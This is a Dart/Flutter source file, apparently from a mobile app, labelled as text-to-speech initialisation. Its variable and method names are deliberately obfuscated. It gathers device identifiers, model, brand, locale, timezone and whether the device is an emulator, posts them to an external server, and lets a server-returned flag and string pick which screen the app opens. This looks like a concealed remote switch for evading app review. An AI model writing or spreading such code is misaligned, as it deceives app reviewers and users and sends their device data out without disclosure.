import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void ytohashgs() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/connect_failed");
  }
}

class TtsInitLogic extends GetxController {

  var olqhezyvuw = RxBool(false);
  var lnwguze = RxBool(true);
  var nvhp = RxString("");
  var june = RxBool(false);
  var steuber = RxBool(true);
  final pszkbq = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ytohashgs();
    hlkotsd();
  }


  Future<void> hlkotsd() async {

    june.value = true;
    steuber.value = true;
    lnwguze.value = false;

    pszkbq.post("https://opa.vanisded.com/diglquxvmotwaszbhecryfpjkn",data: await ikuzyblfr()).then((value) {
      var cajdnh = value.data["cajdnh"] as String;
      var ydbtqrec = value.data["ydbtqrec"] as bool;
      if (ydbtqrec) {
        nvhp.value = cajdnh;
        alejandrin();
      } else {
        ratke();
      }
    }).catchError((e) {
      lnwguze.value = true;
      steuber.value = true;
      june.value = false;
    });
  }

  Future<Map<String, dynamic>> ikuzyblfr() async {
    final DeviceInfoPlugin apmof = DeviceInfoPlugin();
    PackageInfo uoskbld_lsgmfqw = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var cztsnhmp = Platform.localeName;
    var xouh = currentTimeZone;

    var hqexizws = uoskbld_lsgmfqw.packageName;
    var ponkujq = uoskbld_lsgmfqw.version;
    var idaufrsq = uoskbld_lsgmfqw.buildNumber;

    var usxq = uoskbld_lsgmfqw.appName;
    var bhojres = "";
    var umrbnkf  = "";
    var clynij = "";
    var noemieChamplin = "";
    var ramonRunte = "";
    var kianErdman = "";
    var adrienneReichel = "";
    var heleneKutch = "";


    var aobty = "";
    var qhnxew = false;

    if (GetPlatform.isAndroid) {
      aobty = "android";
      var mhgvnjpa = await apmof.androidInfo;

      clynij = mhgvnjpa.brand;

      bhojres  = mhgvnjpa.model;
      umrbnkf = mhgvnjpa.id;

      qhnxew = mhgvnjpa.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      aobty = "ios";
      var pdfkhiwsue = await apmof.iosInfo;
      clynij = pdfkhiwsue.name;
      bhojres = pdfkhiwsue.model;

      umrbnkf = pdfkhiwsue.identifierForVendor ?? "";
      qhnxew  = pdfkhiwsue.isPhysicalDevice;
    }
    var res = {
      "usxq": usxq,
      "idaufrsq": idaufrsq,
      "hqexizws": hqexizws,
      "xouh": xouh,
      "clynij": clynij,
      "noemieChamplin" : noemieChamplin,
      "ramonRunte" : ramonRunte,
      "umrbnkf": umrbnkf,
      "cztsnhmp": cztsnhmp,
      "aobty": aobty,
      "qhnxew": qhnxew,
      "bhojres": bhojres,
      "kianErdman" : kianErdman,
      "adrienneReichel" : adrienneReichel,
      "ponkujq": ponkujq,
      "heleneKutch" : heleneKutch,

    };
    return res;
  }

  Future<void> ratke() async {
    Get.offAllNamed("/tab");
  }

  Future<void> alejandrin() async {
    Get.offAllNamed("/tts_config_init");
  }
}
